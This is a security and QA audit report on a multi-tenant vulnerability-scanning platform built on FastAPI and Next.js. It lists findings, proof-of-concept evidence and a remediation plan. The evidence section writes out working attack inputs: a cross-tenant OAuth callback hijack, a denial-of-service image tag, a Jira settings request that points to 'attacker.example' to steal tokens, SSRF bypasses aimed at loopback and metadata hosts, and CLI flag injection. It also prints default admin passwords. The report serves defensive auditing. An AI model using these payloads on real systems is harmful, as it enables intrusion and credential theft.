# SigmaSec QA & Security Audit Report

**Date:** October 1, 2026  
**Auditor / Reviewer:** Security & QA Review Team  
**Scope:** Full-Stack Architecture, Backend APIs, Platform UI, Scanners, Multi-Tenancy & Auth, CI/CD  
**Overall Status:** 🔴 **Critical Risk** (Do not deploy or expose to the public internet in current state)  
**Environment Note:** Evaluation was performed using isolated, non-invasive scratchpad environments (venv, throwaway local Postgres & Redis, static analyzers, test suites, and simulated exploit probes). No repository files were modified during the review.

---

## 1. Project Overview & Architecture

### Technology Stack
- **Backend:** FastAPI `0.138` on Python 3.12, SQLAlchemy & Alembic on PostgreSQL 16, Celery on Redis, MinIO (S3-compatible storage for PDF reports), Flower (Celery monitoring).
- **Frontend:** Next.js `16.2.7` with React 19, NextAuth v4 (Credentials provider, JWT session strategy), deployed on Vercel.
- **Security Scanners:** Subprocess orchestration for `nuclei`, `trivy`, `gitleaks`, `opengrep`, and `nmap`.
- **AI Integrations:** Ollama (local LLM) or Anthropic API.
- **Local Runtime:** Orchestrated via `docker-compose.yml`.

### Configuration & Secrets Management
- Configuration is loaded from environment variables via `python-dotenv` from `backend/.env`.
- `DATABASE_URL` and `JWT_SECRET` are required.
- `ENCRYPTION_KEY` and MinIO credentials silently fall back to insecure hardcoded defaults if omitted.

### High-Level Architecture
- **API Communication:** Browser communicates directly with FastAPI (`NEXT_PUBLIC_API_BASE_URL`) using Bearer tokens obtained from the NextAuth session. Selected server-side routes proxy requests via `/api/backend/*`.
- **Authentication & Tenancy:** HS256-signed JWTs with 8-hour validity. User roles comprise `admin`, `analyst`, and `viewer`. Multi-tenancy is scoped via `org_id` on the user model, resolved via `get_user_org_id`.
- **Scanning Pipeline:** `POST /scans` enqueues a Celery chord of scanner subtasks. Findings are deduplicated by fingerprint, enriched with NVD, KEV, and EPSS threat intelligence plus AI summaries, and aggregated.
- **Third-Party Integrations:** Jira, Slack, and GitHub (automated fix pull requests). Tokens are stored encrypted with Fernet symmetric encryption.
- **CI/CD:** No CI/CD pipelines or automated GitHub Actions workflows currently exist (missing `.github/workflows`).

---

## 2. Build & Test Baseline

All baseline commands were executed against a clean clone in isolated test environments.

| Target / Command | Status | Result / Observations |
| :--- | :---: | :--- |
| `pip install -r backend/requirements.txt` | ❌ Fails | `opengrep` does not exist on PyPI; Docker image build fails as a consequence. Remaining packages install. |
| `alembic upgrade head` | ⚠️ Incomplete | Succeeds, but generated schema is incomplete; requires raw startup DDL statements to function (see QA-3). |
| `ruff check app tests` | ❌ Fails | 134 lint/syntax errors, including 2 critical runtime bugs (`F821 undefined name 'logger'` in `runner.py`). |
| `black --check` | ❌ Fails | 49 files require reformatting. |
| `pytest tests` (Fresh DB, Alembic migrations only) | ❌ Fails | 9 failed, 31 passed, 7 errors (fails due to schema mismatch). |
| `pytest tests` (Fresh DB, after startup DDL) | ❌ Fails | 4 failed, 38 passed, 5 errors. Re-running without reset increases failures (6 failed, 9 errors) due to test state leakage and fixed slugs. |
| Frontend `npm ci` (Repository root) | ❌ Fails | Root `package.json` declares a workspace without a root lockfile. Succeeds when run from an isolated copy with frontend lockfile. |
| `tsc --noEmit` (Frontend) | ❌ Fails | 36 TypeScript compilation errors: `Cannot find module '@/lib/...'`. |
| `npm run lint` (`next lint`) | ❌ Fails | Script is broken on Next.js 16. Executing `npx eslint .` yields 71 errors and 113 warnings. |
| `vitest run` | ❌ Fails | Unit test file fails on import: `@/lib/utils` not found. |
| `next build` | ❌ Fails | Module build error: `@/lib/utils` not found. |
| `npm audit` | ❌ High Risk | 3 Critical, 10 High, 8 Moderate vulnerabilities detected. |
| `pip-audit` | ❌ High Risk | 27 security advisories detected across 7 Python dependencies. |
| Git History Secret Scan | ✅ Clean | No active credentials discovered (only placeholders and AWS documentation sample keys). |

---

## 3. Executive Summary

> [!CAUTION]
> **Overall Assessment: Critical Risk.**  
> SigmaSec must not be exposed to the public internet or production workloads in its current state. Immediate remediation of authentication, multi-tenant boundaries, and SSRF controls is required.

### Key Risk Areas:
1. **Hardcoded Administrative Credentials & Denial-of-Service Routes:** Every backend startup creates or resets an administrator account (`admin@sigmasec.com`) to a known, hardcoded password published in documentation (`runGuide.md`). Furthermore, two unauthenticated GET endpoints allow any unauthenticated user or browser image tag to immediately terminate the backend process (`os._exit(0)`).
2. **Multi-Tenant Isolation Failures at Boundary Endpoints:** While core findings and asset models enforce tenant scoping, critical administrative endpoints do not. Any self-registered user can enumerate all organizations, view tenant-wide AI spend, and hijack another organization's GitHub integration without authentication.
3. **Broken Object/Function-Level Authorization (BFLA):** Critical integration and write endpoints only check for authentication (`get_current_user`), failing to enforce role restrictions. A read-only `viewer` can redirect Jira integrations to an attacker-controlled endpoint to exfiltrate Jira API tokens, or receive GitHub access tokens in unredacted error responses.
4. **Server-Side Request Forgery (SSRF) in Scanner Pipeline:** Target validation relies on a fragile hostname prefix regex without DNS resolution. Attackers can leverage scanning workers to probe internal cloud metadata services (`169.254.169.254`, `metadata.google.internal`), private networks, loopback addresses, or inject CLI arguments.
5. **QA & Operational Fragility:** Clean clones fail to build or compile on both frontend and backend due to missing repository files (`frontend/platform-ui/lib/` ignored by `.gitignore`), non-existent PyPI packages (`opengrep`), unmigrated schema DDL executed at runtime, and non-hermetic test suites.

---

## 4. Security Findings & Vulnerability Matrix

| ID | Severity | Category | Location | Description & Impact | Recommended Remediation |
| :---: | :---: | :--- | :--- | :--- | :--- |
| **S-1** | `Critical` | Default Credentials | `backend/app/seed.py:28-68`<br>`backend/app/main.py:147-152` | `seed()` executes on every startup, creating or resetting `admin@sigmasec.com` (`Admin@12345!`) and `analyst@sigmasec.com` (`Analyst@12345!`). Passwords are logged to stdout and documented in `runGuide.md:182`. Password rotations are reverted upon restart. | Remove automated seeding from backend startup. Implement an explicit CLI command restricted to `ENVIRONMENT=development` that generates random passwords and never overwrites existing accounts. |
| **S-2** | `Critical` | Missing Auth / Remote DoS | `backend/app/main.py:194-199`<br>`backend/app/routers/scans.py:52-57` | Endpoints `GET /restart-backend` and `GET /scans/restart-backend` execute `os._exit(0)` with zero authentication. A single unauthenticated GET request (or `<img src>` tag) terminates the API process. | Remove both endpoints immediately. Process management must be delegated to container orchestrators (e.g., Docker, Kubernetes, systemd). |
| **S-3** | `High` | Broken Access Control (Cross-Tenant) | `backend/app/routers/admin.py:466-523` | The GitHub OAuth callback lacks authentication and associates incoming tokens with whichever org is specified in `?state=` or `?org_id=`. If omitted, it falls back to the first org in the DB. `state` is a raw UUID without CSRF protection. | Require a cryptographically signed, single-use `state` token bound to the authenticated user's session. Validate `state` upon callback, derive `org_id` strictly from the session, and eliminate default org fallbacks. |
| **S-4** | `High` | Information Disclosure (Cross-Tenant) | `backend/app/routers/orgs.py:37-43`<br>`backend/app/routers/admin.py:84-152` | `GET /orgs` returns all organizations in the platform, and `GET /admin/ai-usage` aggregates names, token counts, and costs across all tenants. Any newly signed-up user is an `admin` of their own org, allowing them to access these global endpoints. | Introduce a dedicated `superadmin` platform role for cross-tenant metrics, or strictly scope queries to the caller's authenticated `org_id`. |
| **S-5** | `High` | BFLA / Secret Exfiltration | `backend/app/routers/admin.py:176-449, 530-533`<br>`backend/app/routers/findings.py:187, 262, 354, 844` | Settings for Jira, Slack, GitHub, Nuclei template updates, `create-fix-pr`, `create-jira-ticket`, `bulk-pr`, and `PATCH /findings` require only `get_current_user` (no role validation). Submitting masked token `********` retains existing secret while allowing `base_url` modification. | Enforce `require_role("admin")` for integrations and `require_role(["admin", "analyst"])` for mutating actions. Automatically wipe stored tokens whenever `base_url` or `webhook_url` changes. Implement domain allowlisting (e.g., `*.atlassian.net`). |
| **S-6** | `High` | Sensitive Data Leakage in Errors | `backend/app/routers/findings.py:459-461, 632-639` | Git clone command embeds token in URL: `git clone https://x-access-token:{token}@github.com/...` with `check=True`. Upon failure, `str(CalledProcessError)` contains the command line with raw token and returns it in the 400 response and logs. | Pass tokens via `GIT_ASKPASS` or `http.extraheader` rather than the clone URL. Return sanitized, generic error messages to clients and redact credentials from server logs. |
| **S-7** | `High` | SSRF / Internal Network Probing | `backend/app/routers/scans.py:59-76, 141`<br>`backend/app/tasks/scan_tasks.py:476-488, 588`<br>`backend/app/routers/admin.py:304, 336` | `validate_target` checks hostname prefix against a regex without DNS resolution. `git_repo` and `docker_image` are unvalidated. Integration test endpoints accept arbitrary URLs. Scanners can be directed to internal IPs, metadata endpoints (`169.254.169.254`, `metadata.google.internal`), and loopback addresses. | Parse URLs, perform pre-flight DNS resolution, and validate all resolved IPs using Python's `ipaddress` library to reject loopback, RFC 1918 private, link-local, multicast, and CGNAT blocks. Enforce worker network egress filtering and target ownership verification. |
| **S-8** | `Medium` | Local File & Argument Injection | `backend/app/adapters/opengrep.py:103`<br>`backend/app/adapters/nmap.py:69-89`<br>`backend/app/adapters/trivy.py:313-321` | Targets matching local directories (e.g., `/app`) trigger filesystem scans (`os.path.isdir`), exposing worker source code and `.env`. Targets starting with `-` pass validation and get interpreted as CLI flags by subprocesses due to missing `--` separators. | Validate that scan targets are strictly valid URLs or FQDNs. Reject input beginning with `-`. Insert `--` before positional targets in CLI invocations. Disallow local directory scanning unless explicitly configured by internal administrator flag. |
| **S-9** | `Medium` | Information Disclosure & Cost Abuse | `backend/app/main.py:160-191`<br>`backend/app/routers/scans.py:28-49` | `/test-export-debug` is completely unauthenticated (returns HTTP 200), outputs `traceback.format_exc()`, and triggers costly third-party AI summarization requests. | Delete the debug endpoint completely. |
| **S-10** | `Medium` | Missing Rate Limiting / Brute Force | `backend/app/main.py:30`<br>`backend/app/routers/auth.py:70`<br>`backend/app/routers/scans.py:107-129` | SlowAPI limiter is initialized but never attached to `/auth/token` (30 consecutive failed logins return 401 without throttling). Scan rate limiting is held in in-memory process state keyed by client IP, breaking under load balancers/proxies. | Apply Redis-backed `@limiter.limit` decorators to login and registration endpoints. Key scan limits by tenant/user ID. Implement account lockout and exponential backoff policies. |
| **S-11** | `Medium` | Weak Cryptographic Fallbacks | `backend/app/utils/encryption.py:11, 36` | If `ENCRYPTION_KEY` is missing from environment, the system silently uses a hardcoded fallback key. If decryption fails, `decrypt_value` silently returns the raw input value unchanged. | Fail startup immediately if `ENCRYPTION_KEY` is undefined or malformed. Remove plaintext return fallbacks; raise explicit decryption exceptions. |
| **S-12** | `Medium` | Insecure Frontend Auth Fallback | `frontend/platform-ui/app/api/auth/[...nextauth]/route.ts:40-53, 69-80` | When the backend is unreachable, NextAuth credentials provider grants a mock authenticated admin session for any email with a password of 6+ characters. If `/auth/me` fails, role defaults to `admin`. | Remove offline bypass logic. Ensure auth failures fail closed immediately. Never assign default administrative privileges on failure. |
| **S-13** | `Medium` | Missing Security Headers | `frontend/platform-ui/next.config.ts`<br>`backend/app/main.py` | No CSP, HSTS, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy headers are configured on either frontend or backend. Increases risk of clickjacking and token exfiltration via XSS. | Add standard security headers in `next.config.ts` via `headers()` and implement a FastAPI middleware for backend API responses. |
| **S-14** | `Medium` | Insecure Infrastructure Defaults | `docker-compose.yml:36-40, 62, 85-88, 190-209` | PostgreSQL (`admin/secret`) and MinIO (`minioadmin`) use default credentials. Redis, Postgres, MinIO, and Flower are exposed on `0.0.0.0` without authentication on Redis or Flower. | Bind internal service ports to `127.0.0.1` or eliminate host port mappings in Docker Compose. Enforce strong passwords via `.env`. Enable Flower HTTP Basic Auth (`--basic_auth`). |
| **S-15** | `Medium` | Known Vulnerable Dependencies | `frontend/platform-ui/package.json`<br>`backend/requirements.txt` | Frontend has Next.js `16.2.7` (critical middleware/proxy bypass GHSA-6gpp-xcg3-4w24, fixed in `16.3.8`), `next-auth` ≤4.24.14, and `vitest` ≤4.1.10. Backend includes outdated `tornado` (`6.5.7`), `cryptography` (`49.0`), and unmaintained `python-jose` (using vulnerable `ecdsa`). | Upgrade Next.js to `>=16.3.8`, `next-auth` to patched version, and Python packages (`tornado>=6.5.9`, `cryptography>=50.0.0`). Migrate from `python-jose` to `PyJWT`. |
| **S-16** | `Low` | Exception & Internal Data Leakage | `backend/app/routers/admin.py:51, 77, 317, 355, 448`<br>`backend/app/routers/findings.py:731, 995`<br>`backend/app/routers/scans.py:426`<br>`backend/app/main.py:202-212` | Unhandled exceptions and raw database error strings are returned directly to HTTP clients. `/health` exposes `migration_error` internal stack traces. | Sanitize client error responses. Log technical details and tracebacks server-side with correlation IDs. |
| **S-17** | `Low` | User & Account Enumeration | `backend/app/routers/auth.py:36-41`<br>`backend/app/routers/users.py:31-35` | Registration endpoint returns HTTP 409 with explicit message `"Email 'x' already registered"`, enabling account enumeration. | Return generic responses (e.g., "If this account does not exist, a confirmation link has been sent"). |
| **S-18** | `Low` | Token Revocation & Lifetime Mismatch | `backend/app/auth/jwt.py`<br>`route.ts:168-205` | No token revocation list or `jti` invalidation on logout. NextAuth session duration is 30 days while backend JWT expires in 8 hours, causing stale session desyncs. | Implement a token denylist or `token_version` check in Redis/DB. Align frontend session timeout with backend JWT expiration. |
| **S-19** | `Low` | Overly Permissive CORS Regex | `backend/app/main.py:53` | CORS middleware configures `allow_origin_regex` trusting all `https://*.vercel.app` subdomains with credentials enabled. Any malicious Vercel deployment could attempt credentialed cross-origin requests. | Restrict CORS allowed origins to explicitly declared domains configured via environment variables. |
| **S-20** | `Low` | Unvalidated Link Rendering | `backend/app/routers/findings.py:286`<br>`frontend/.../scans/[id]/page.tsx:2261` | `pr_url` accepts arbitrary strings and renders them directly in anchor tags. While React 19 blocks `javascript:` pseudo-protocols, users can still be directed to phishing URLs. | Enforce server-side URL validation ensuring `pr_url` strictly matches `^https://github\.com/[\w.-]+/[\w.-]+/pull/\d+$`. |

---

### Detailed Evidence & Proof-of-Concepts (S-1 to S-7)

#### S-1: Hardcoded Administrative Credentials Reset
Observed startup log on fresh database instance:
```text
Created Admin: admin@sigmasec.com / Admin@12345!
Created Analyst: analyst@sigmasec.com / Analyst@12345!
```
Verification in `backend/app/seed.py:42-47`:
```python
if admin:
    admin.hashed_password = pwd_context.hash("Admin@12345!")
```
Any container restart overwrites administrator credentials back to the documented default.

#### S-2: Remote Denial of Service via Unauthenticated GET
Route inspection confirms zero authentication dependencies:
```python
@app.get("/restart-backend")
def restart_backend():
    os._exit(0)
```
Accessible by any unauthenticated web client or CSRF image tag: `<img src="http://api.sigmasec.com/restart-backend">`.

#### S-3: Cross-Tenant GitHub OAuth Integration Hijacking
Configured victim organization with valid GitHub token, then executed unauthenticated callback:
```http
GET /admin/github/callback?code=mock_oauth_code&state=<victim_org_uuid> HTTP/1.1
Host: api.sigmasec.com
```
Response: HTTP 307 Redirect.  
Database state: `victim_org` GitHub access token was overwritten with `ghp_mock_developer_access_token_123456`.

#### S-4: Cross-Tenant Organization & AI Spend Enumeration
Authenticated as a newly registered attacker user:
```http
GET /orgs HTTP/1.1
Authorization: Bearer <attacker_jwt>
```
Response: HTTP 200 OK — returned all 5 platform organizations.  
Similarly, `GET /admin/ai-usage` joins `Org` without an `org_id` filter (`admin.py:90-109`), exposing token consumption and AI cost across all customers.

#### S-5: Privilege Escalation & Jira API Token Theft by Viewer
Authenticated with a read-only `viewer` role token:
```http
POST /admin/settings/jira HTTP/1.1
Authorization: Bearer <viewer_jwt>
Content-Type: application/json

{
  "base_url": "https://attacker.example",
  "api_token": "********",
  "email": "user@example.com"
}
```
Response: HTTP 200 OK. Stored `base_url` updated to `https://attacker.example` while preserving original secret. Triggering `/admin/jira/test` or creating a ticket (`findings.py:929-968`) subsequently transmits:
```http
Authorization: Basic <base64_encoded(email:VICTIM_REAL_TOKEN)>
```
directly to the attacker's server.

#### S-6: GitHub Token Leakage via Subprocess Execution Errors
Simulated clone failure using `backend/app/routers/findings.py:636-639`:
```text
Command '['git', 'clone', '--depth', '50', 'https://x-access-token:ghp_SECRET_TOKEN@github.com/...']' returned non-zero exit status 128.
```
This unredacted output is returned directly in HTTP 400 response body:
`{"detail": "Autofix PR generation failed: Command '['git', 'clone', ... 'https://x-access-token:ghp_SECRET_TOKEN@...']'..."}`.

#### S-7: SSRF Target Validation Bypasses
The following target payloads were accepted by `validate_target` (`backend/app/routers/scans.py:59-76`):
- `http://2130706433/` (Dword format for `127.0.0.1`)
- `http://[::1]/` (IPv6 localhost)
- `http://0177.0.0.1/` (Octal format for `127.0.0.1`)
- `http://x@127.0.0.1/` (Userinfo prefix bypass)
- `http://100.100.100.200/` (CGNAT address block)
- `http://metadata.google.internal/` (Cloud metadata endpoint)
- `/app` (Local filesystem directory)
- `-iL=/etc/passwd` (CLI flag injection)

---

## 5. QA & Code Quality Findings

| ID | Severity | Location | Issue Description & Operational Impact |
| :---: | :---: | :--- | :--- |
| **QA-1** | `High` | `.gitignore:44` | The root `.gitignore` contains a generic Python `lib/` ignore rule, which inadvertently ignores `frontend/platform-ui/lib/`. Essential files (`utils.ts`, `sound-cues.ts`, `sla-calculator.ts`, `tag-colors.ts`) were not committed. Clean clones fail TypeScript compilation, unit tests, and production builds (`next build`). |
| **QA-2** | `High` | `backend/requirements.txt` | Includes `opengrep` as a pip dependency; however, `opengrep` is not published on PyPI. `pip install` and Docker image builds fail. |
| **QA-3** | `Medium` | `backend/app/main.py:78-132` | 9 finding columns and a unique fingerprint index are managed via raw `ALTER TABLE` DDL queries on application startup rather than Alembic migrations. A fresh database initialized strictly via `alembic upgrade head` fails with `column "ai_why_now" does not exist`. |
| **QA-4** | `Medium` | `backend/app/adapters/runner.py:87, 108` | Variable `logger` is undefined. If a Redis outage occurs during task execution, a `NameError` is raised, causing the scan to abort (violating the requirement that Redis failures must not crash active scans). |
| **QA-5** | `Medium` | `backend/tests/*` | Test suite lacks isolation: tests execute against shared dev database, utilize static organization slugs, and lack database teardown fixtures. `test_multitenancy` expects 403 but receives 422; `setup_db` fixture is missing; tests write binary artifacts (`test_output_executive.pdf`, `test_output_technical.pdf`) directly into the source tree instead of `tmp_path`. |
| **QA-6** | `Medium` | `backend/app/routers/scans.py:277-335`<br>`backend/app/routers/findings.py:354-639` | SSE streaming endpoint (`scans.py`) executes synchronous database and Redis queries inside an `async` generator, blocking the ASGI event loop every 4s per active client. Similarly, `create-fix-pr` executes synchronous `git clone` and `npm install` within request handlers. |
| **QA-7** | `Medium` | `backend/app/routers/findings.py:411-414`<br>`backend/app/tasks/scan_tasks.py:258` | Working directories use predictable, static directory paths (`autofix_{finding_id}`, `/tmp/enrich_{scan_id}`). Concurrent tasks risk race conditions, collision, and mutual directory deletion via `shutil.rmtree`. |
| **QA-8** | `Medium` | `backend/app/routers/findings.py:222-228, 397-401, 597-599` | `bulk-pr` fabricates synthetic PR URLs and prematurely marks findings as `open`. If GitHub tokens are invalid, `create-fix-pr` reports fictitious pull request numbers (`PR #142`), falsely reporting to users that fixes have been merged. |
| **QA-9** | `Medium` | `backend/app/tasks/scan_tasks.py:163-175` | Finding deduplication re-parents existing findings to the newest scan ID, resulting in historical findings disappearing from prior scans and executive PDF reports. |
| **QA-10** | `Low` | `backend/app/routers/findings.py:78-82, 124-133`<br>`backend/app/routers/scans.py:240-244` | List endpoints lack database-level pagination. Tag filtering is performed in Python memory, Remediation Hub triggers N+1 queries per asset, and Dashboard views load all findings into memory at once. |
| **QA-11** | `Low` | `next.config.ts:5`<br>Repository root | Build configuration suppresses errors with `typescript.ignoreBuildErrors: true`. `next lint` fails under Next.js 16. Stray files are checked into git: `backend/-` (nuclei stdout), `backend/app/adapters0.zip` (compiled `.pyc`), and ~3MB of image posters. `pwd_context` is duplicated across 3 modules. |

---

## 6. Test Coverage Deficits & Requirements

Existing automated coverage consists of 47 backend tests (predominantly parser and client unit tests) and 1 failing frontend test file. Zero end-to-end tests or CI workflows exist.

The following test suites must be created:
1. **Role-Based Access Control (RBAC) Matrix:** Verify HTTP 403 Forbidden responses when `viewer` roles attempt integration modifications, `create-fix-pr`, `create-jira-ticket`, `PATCH /findings`, Nuclei template updates, or scan creation.
2. **Multi-Tenant Isolation Tests:** Assert that Org A administrators receive 403/404 when querying Org B resources in `/orgs`, `/admin/ai-usage`, and integration endpoints. Validate that unauthenticated GitHub OAuth callbacks are rejected.
3. **SSRF Target Validation Matrix:** Parametrized unit tests covering IP formats (decimal, octal, hex, IPv6), private IP ranges, loopback aliases, metadata hosts, CLI injection prefixes (`-`), and local filesystem paths.
4. **Authentication & Session Resilience:** Test login rate limiting (HTTP 429 upon the 6th consecutive failure), account duplicate registration handling, expired/deactivated JWT rejection (HTTP 401), and rejection of seeding scripts in production.
5. **Secret Handling & Sanitization:** Confirm that subprocess failures in `create-fix-pr` redact tokens from logs and error messages; verify that modifying integration endpoints clears stored credentials; assert backend startup crashes if `ENCRYPTION_KEY` is undefined.
6. **Database Migration & Data Layer Hermeticity:** Validate `save_findings` upsert logic against a pristine database migrated purely through Alembic.
7. **Frontend Auth & Route Gating:** Unit tests verifying NextAuth `authorize` callback fails closed when the backend is offline, and Next.js middleware properly redirects unauthenticated traffic.

---

## 7. Remediation Roadmap

### Phase 1: Quick Wins (< 1 Hour Each)
- [ ] **S-2 & S-9:** Delete unauthenticated `/restart-backend` and `/test-export-debug` endpoints *(15m)*.
- [ ] **S-1:** Restrict database seeding behind an explicit CLI command and `ENVIRONMENT=development` guard *(30m)*.
- [ ] **S-4:** Restrict `/orgs` and `/admin/ai-usage` to caller's `org_id` or require a platform `superadmin` role *(45m)*.
- [ ] **S-5:** Add `require_role("admin")` to integration routes and `require_role(["admin", "analyst"])` to write routes *(45m)*.
- [ ] **S-6:** Redact GitHub access tokens from git clone error handlers and return sanitized error details *(45m)*.
- [ ] **QA-1:** Update `.gitignore` to unignore `frontend/platform-ui/lib/` and restore missing utility files *(15m)*.
- [ ] **QA-2:** Remove `opengrep` from `backend/requirements.txt` *(5m)*.
- [ ] **QA-4:** Import and configure `logger` in `backend/app/adapters/runner.py` *(5m)*.
- [ ] **S-11:** Enforce immediate startup failure if `ENCRYPTION_KEY` is missing or invalid *(20m)*.
- [ ] **S-12:** Remove offline mock admin fallback from NextAuth `[...nextauth]/route.ts` *(20m)*.

### Phase 2: Short-Term Core Hardening (< 1 Day Each)
- [ ] **S-3:** Implement signed, stateful GitHub OAuth handshake tied to user session *(3h)*.
- [ ] **S-7 & S-8:** Implement DNS resolution pre-flight validation, `--` CLI argument delimiters, and reject local paths *(4h)*.
- [ ] **S-5 (Secret Wiping):** Automatically clear stored tokens whenever integration destination URLs change *(1h)*.
- [ ] **S-10:** Configure Redis-backed SlowAPI rate limits on login, signup, and scan creation *(2h)*.
- [ ] **QA-3:** Generate standard Alembic migration for the 9 finding columns and fingerprint index, removing startup DDL *(2h)*.
- [ ] **S-13:** Configure standard HTTP security headers across Next.js and FastAPI *(2h)*.
- [ ] **S-15:** Upgrade vulnerable dependencies (Next.js 16.3.8, `next-auth`, Python packages) *(3h)*.
- [ ] **S-14:** Harden `docker-compose.yml` (bind internal services to `127.0.0.1`, set strong credentials, enable Flower auth) *(1h)*.
- [ ] **QA-5:** Implement hermetic test database fixtures, clean up PDF generation paths to `tmp_path`, and build RBAC test suite *(1 day)*.

### Phase 3: Architectural & Long-Term Improvements
- [ ] Offload long-running operations (fix PR creation, PDF export, AI summaries) to Celery background tasks.
- [ ] Refactor SSE endpoints to fully asynchronous non-blocking generators.
- [ ] Implement database-level keyset or offset pagination across all finding and scan list endpoints.
- [ ] Implement token revocation / denylist in Redis and synchronize NextAuth and backend token lifetimes.
- [ ] Establish automated GitHub Actions CI pipeline running ruff, pytest, tsc, eslint, build, and security audits.
- [ ] Add formal target ownership verification mechanisms and egress network firewall rules for scan workers.
- [ ] Repository hygiene: eliminate stray files (`backend/-`, `adapters0.zip`, large image assets) and deduplicate utility modules.

---

## 8. Open Action Items & Required Decisions

1. **Missing Frontend Library Files (QA-1):** `frontend/platform-ui/lib/*.ts` was omitted from git due to `.gitignore:44`. The team needs to either push the original files from the local workstation or authorize generating clean implementations for `utils.ts` (shadcn `cn` utility) and stubs for `sound-cues.ts`, `sla-calculator.ts`, and `tag-colors.ts`.
2. **Finding Deduplication & Historical Records (QA-9):** Confirm whether de-duplicated findings should retain links to all historical scans (many-to-many relationship) or whether re-parenting to the latest scan was intentional.